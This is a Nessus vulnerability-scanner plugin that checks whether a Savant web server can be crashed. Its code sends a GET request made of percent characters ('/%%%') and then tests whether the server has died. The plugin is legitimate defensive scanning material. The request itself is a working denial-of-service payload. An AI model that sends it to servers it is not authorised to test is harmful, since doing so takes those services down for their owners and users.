#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10633);
 script_version ("$Revision: 1.15 $");
 script_bugtraq_id(2468);
 script_xref(name:"OSVDB", value:"55324");
 
 script_name(english:"Savant Web Server Multiple Percent Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to cause the Savant web server on the remote host 
to lock by sending a specially crafted GET request for a URL
composed of percent characters." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version newer than 3.0." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

 
 script_summary(english:"Crashes the remote web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if (!banner || "Savant/" >!< banner) exit(0);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:"/%%%", port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port, retry: 3))security_warning(port);
  }
}
